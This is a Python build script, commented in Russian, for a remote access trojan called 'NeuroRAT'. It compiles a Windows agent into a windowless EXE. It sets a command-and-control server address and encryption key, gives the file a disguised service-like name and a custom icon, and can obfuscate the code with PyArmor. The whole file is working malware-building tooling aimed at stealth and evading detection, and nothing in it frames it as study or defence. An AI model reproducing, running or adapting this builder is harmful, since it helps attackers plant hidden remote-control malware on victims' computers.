#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NeuroRAT Windows Agent Builder
Компилирует агент в EXE файл с помощью PyInstaller
"""

import os
import sys
import subprocess
import random
import string
import argparse

def random_name(length=8):
    """Генерирует случайное имя для агента"""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def build_agent(output_name=None, icon_path=None, server_address=None, obfuscate=False):
    """Компилирует агент в EXE файл"""
    print("[*] NeuroRAT Windows Agent Builder")
    
    if not os.path.exists("windows_agent.py"):
        print("[-] Error: windows_agent.py not found")
        return False
    
    # Если имя не указано, используем случайное
    if not output_name:
        output_name = f"win_service_{random_name()}.exe"
    elif not output_name.endswith('.exe'):
        output_name += '.exe'
    
    print(f"[+] Building agent: {output_name}")
    
    # Настраиваем конфигурацию сервера если указан
    if server_address:
        print(f"[+] Setting C2 server address: {server_address}")
        with open("windows_agent.py", "r", encoding="utf-8") as f:
            agent_code = f.read()
        
        # Заменяем адрес сервера
        agent_code = agent_code.replace('"server_address": "http://localhost:8080"', f'"server_address": "{server_address}"')
        
        # Генерируем случайный ключ шифрования
        encryption_key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
        agent_code = agent_code.replace('"encryption_key": "n3ur0r4t_s3cr3t_k3y"', f'"encryption_key": "{encryption_key}"')
        
        with open("windows_agent_temp.py", "w", encoding="utf-8") as f:
            f.write(agent_code)
        
        agent_file = "windows_agent_temp.py"
    else:
        agent_file = "windows_agent.py"
    
    # Пытаемся импортировать PyInstaller
    try:
        import PyInstaller
    except ImportError:
        print("[*] PyInstaller not found, attempting to install...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
    
    # Собираем аргументы для PyInstaller
    pyinstaller_args = [
        "pyinstaller",
        "--onefile",  # Один EXE файл
        "--noconsole",  # Без консоли
        "--clean",  # Очистка временных файлов
        f"--name={output_name}",
    ]
    
    # Добавляем иконку если указана
    if icon_path:
        if os.path.exists(icon_path):
            pyinstaller_args.append(f"--icon={icon_path}")
            print(f"[+] Using icon: {icon_path}")
        else:
            print(f"[-] Warning: Icon {icon_path} not found, using default")
    
    # Добавляем необходимые библиотеки
    pyinstaller_args.extend([
        "--hidden-import=urllib.request",
        "--hidden-import=json",
        "--hidden-import=ctypes",
        "--hidden-import=shutil",
        "--hidden-import=winreg",
    ])
    
    # Если нужно обфусцировать, добавляем соответствующие аргументы
    if obfuscate:
        try:
            import pyarmor
        except ImportError:
            print("[*] PyArmor not found, attempting to install...")
            subprocess.run([sys.executable, "-m", "pip", "install", "pyarmor"], check=True)
        
        print("[+] Obfuscating agent code...")
        pyarmor_args = [
            "pyarmor", "obfuscate",
            "--output", "obfuscated",
            agent_file
        ]
        
        try:
            subprocess.run(pyarmor_args, check=True)
            pyinstaller_args.append("obfuscated/windows_agent.py")
        except Exception as e:
            print(f"[-] Obfuscation failed: {str(e)}")
            print("[*] Continuing without obfuscation")
            pyinstaller_args.append(agent_file)
    else:
        pyinstaller_args.append(agent_file)
    
    # Запускаем PyInstaller
    print("[+] Compiling EXE file...")
    try:
        subprocess.run(pyinstaller_args, check=True)
        print(f"[+] Agent built successfully: dist/{output_name}")
        
        # Очищаем временные файлы
        if os.path.exists("windows_agent_temp.py"):
            os.remove("windows_agent_temp.py")
        
        return True
    except Exception as e:
        print(f"[-] Build failed: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(description="NeuroRAT Windows Agent Builder")
    parser.add_argument("-o", "--output", help="Output executable name")
    parser.add_argument("-i", "--icon", help="Path to icon file (.ico)")
    parser.add_argument("-s", "--server", help="C2 server address (e.g. http://example.com:8080)")
    parser.add_argument("--obfuscate", action="store_true", help="Obfuscate the agent code")
    
    args = parser.parse_args()
    
    build_agent(
        output_name=args.output,
        icon_path=args.icon,
        server_address=args.server,
        obfuscate=args.obfuscate
    )

if __name__ == "__main__":
    main() 